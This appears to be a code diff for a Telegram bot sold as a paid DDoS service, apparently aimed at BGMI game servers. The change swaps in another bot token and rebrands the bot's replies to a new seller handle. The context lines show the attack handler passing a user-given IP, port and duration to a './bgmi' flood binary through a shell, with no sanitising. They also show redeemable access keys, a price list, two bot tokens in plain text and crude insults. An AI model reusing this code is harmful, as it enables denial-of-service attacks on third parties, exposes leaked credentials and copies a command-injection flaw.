@@ -10,7 +10,7 @@ from keep_alive import keep_alive
 keep_alive()
 
 # Insert your Telegram bot token here
-bot = telebot.TeleBot('7023448558:AAH_-bHztD6iTvVa772p3MtxK8j7-oVJaOI')
+bot = telebot.TeleBot('7437346079:AAEWJfRBsX0IsOfa_G8Vynx1F69GWcJDFPQ')
 # Admin user IDs
 admin_id = {"5674869424"}
 
@@ -115,7 +115,7 @@ def generate_key_command(message):
                 save_keys()
                 response = f"𝐊𝐞𝐲 𝐆𝐞𝐧𝐞𝐫𝐚𝐭𝐢𝐨𝐧: {key}\n𝐄𝐬𝐩𝐢𝐫𝐞𝐬 𝐎𝐧: {expiration_date}"
             except ValueError:
-                response = "𝐏𝐥𝐞𝐚𝐬𝐞 𝐒𝐩𝐞𝐜𝐢𝐟𝐲 𝐀 𝐕𝐚𝐥𝐢𝐝 𝐍𝐮𝐦𝐛𝐞𝐫 𝐚𝐧𝐝 𝐮𝐧𝐢𝐭 𝐨𝐟 𝐓𝐢𝐦𝐞 (hours/days)."
+                response = "𝐏𝐥𝐞𝐚𝐬𝐞 𝐒𝐩𝐞𝐜𝐢𝐟𝐲 𝐀 𝐕𝐚𝐥𝐢𝐝 𝐍𝐮𝐦𝐛𝐞𝐫 𝐚𝐧𝐝 𝐮𝐧𝐢𝐭 𝐨𝐟 𝐓𝐢𝐦𝐞 (hours/days).@raj14754"
         else:
             response = "𝐔𝐬𝐚𝐠𝐞: /genkey <amount> <hours/days>"
     else:
@@ -142,7 +142,7 @@ def redeem_key_command(message):
             save_keys()
             response = f"✅𝐊𝐞𝐲 𝐫𝐞𝐝𝐞𝐞𝐦𝐞𝐝 𝐒𝐮𝐜𝐜𝐞𝐬𝐟𝐮𝐥𝐥𝐲! 𝐀𝐜𝐜𝐞𝐬𝐬 𝐆𝐫𝐚𝐧𝐭𝐞𝐝 𝐔𝐧𝐭𝐢𝐥𝐥: {users[user_id]}"
         else:
-            response = "𝙆𝙚𝙮 𝙀𝙭𝙥𝙞𝙧𝙚𝙙 𝙤𝙧 𝙞𝙣𝙫𝙖𝙡𝙞𝙙 ."
+            response = "𝙆𝙚𝙮 𝙀𝙭𝙥𝙞𝙧𝙚𝙙 𝙤𝙧 𝙞𝙣𝙫𝙖𝙡𝙞𝙙 .@raj14754"
     else:
         response = "𝐔𝐬𝐚𝐠𝐞: /redeem <key>"
 
@@ -194,11 +194,11 @@ def handle_bgmi(message):
                     start_attack_reply(message, target, port, time)
                     full_command = f"./bgmi {target} {port} {time} 500"
                     subprocess.run(full_command, shell=True)
-                    response = f"𝘼𝙩𝙩𝙖𝙘𝙠 𝘾𝙤𝙢𝙥𝙡𝙚𝙩𝙚𝙙 🔥"
+                    response = f"𝘼𝙩𝙩𝙖𝙘𝙠 𝘾𝙤𝙢𝙥𝙡𝙚𝙩𝙚𝙙 🔥 @raj14754"
             except ValueError:
                 response = "wrong ip port"
         else:
-            response = "✅ 𝙋𝙡𝙚𝙖𝙨𝙚 𝙋𝙧𝙤𝙫𝙞𝙙𝙚 <𝙄𝙋> <𝙋𝙊𝙍𝙏> <𝙏𝙄𝙈𝙀>"
+            response = "✅ 𝙋𝙡𝙚𝙖𝙨𝙚 𝙋𝙧𝙤𝙫𝙞𝙙𝙚 <𝙄𝙋> <𝙋𝙊𝙍𝙏> <𝙏𝙄𝙈𝙀> @raj14754"
     else:
         response = "🚫 𝙐𝙣𝙖𝙪𝙩𝙝𝙤𝙧𝙞𝙨𝙚𝙙 𝘼𝙘𝙘𝙚𝙨𝙨! 🚫\n\nOops! It seems like you don't have permission to use the Attack command. To gain access and unleash the power of attacks, you can:\n👉 Contact an Admin or the Owner for approval.\n🌟 Become a proud supporter and purchase approval.\n💬 Chat with an admin now and level up your experience!\n\nLet's get you the access you need!"
 
@@ -247,7 +247,7 @@ def show_recent_logs(message):
                 with open(LOG_FILE, "rb") as file:
                     bot.send_document(message.chat.id, file)
             except FileNotFoundError:
-                response = "𝐀𝐣𝐢 𝐥𝐚𝐧𝐝 𝐦𝐞𝐫𝐚 𝐍𝐎 𝐃𝐀𝐓𝐀 𝐅𝐎𝐔𝐍𝐃."
+                response = "𝐀𝐣𝐢 𝐥𝐚𝐧𝐝 𝐦𝐞𝐫𝐚 𝐍𝐎 𝐃𝐀𝐓𝐀 𝐅𝐎𝐔𝐍𝐃.@raj14754"
                 bot.reply_to(message, response)
         else:
             response = "𝐀𝐣𝐢 𝐥𝐚𝐧𝐝 𝐦𝐞𝐫𝐚 𝐌𝐄𝐑𝐀 𝐍𝐎 𝐃𝐀𝐓𝐀 𝐅𝐎𝐔𝐍𝐃"
@@ -303,7 +303,7 @@ def show_help(message):
 def welcome_start(message):
     user_name = message.from_user.first_name
     response = f'''🔹 𝙒𝙀𝙇𝘾𝙊𝙈𝙀 𝙏𝙊 𝙄𝙉𝙑𝙄𝙉𝘾𝙄𝘽𝙇𝙀 𝘿𝘿𝙊𝙎 𝘽𝙊𝙏 🔹
-'''
+@raj14754'''
     bot.reply_to(message, response)
 
 @bot.message_handler(commands=['ruleds'])
@@ -331,7 +331,7 @@ VIP 🌟:
 𝐃𝐚𝐲: 150 𝐫𝐬
 𝐖𝐞𝐞𝐤: 600 𝐫𝐬
 𝐌𝐨𝐧𝐓𝐡: 1100 𝐫𝐬 
-@VenomCHA7
+@raj14754
 '''
     bot.reply_to(message, response)
 
@@ -358,7 +358,7 @@ def remove_user(message):
             if target_user_id in users:
                 del users[target_user_id]
                 save_users()
-                response = f"𝐔𝐬𝐞𝐫 {target_user_id} 𝐒𝐮𝐜𝐜𝐞𝐬𝐟𝐮𝐥𝐥𝐲 𝐅𝐮𝐂𝐤𝐞𝐃."
+                response = f"𝐔𝐬𝐞𝐫 {target_user_id} 𝐒𝐮𝐜𝐜𝐞𝐬𝐟𝐮𝐥𝐥𝐲 𝐅𝐮𝐂𝐤𝐞𝐃.@raj14754"
             else:
                 response = "𝐋𝐎𝐋 𝐮𝐬𝐞𝐫 𝐧𝐨𝐭 𝐟𝐨𝐮𝐧𝐝😂"
         else:
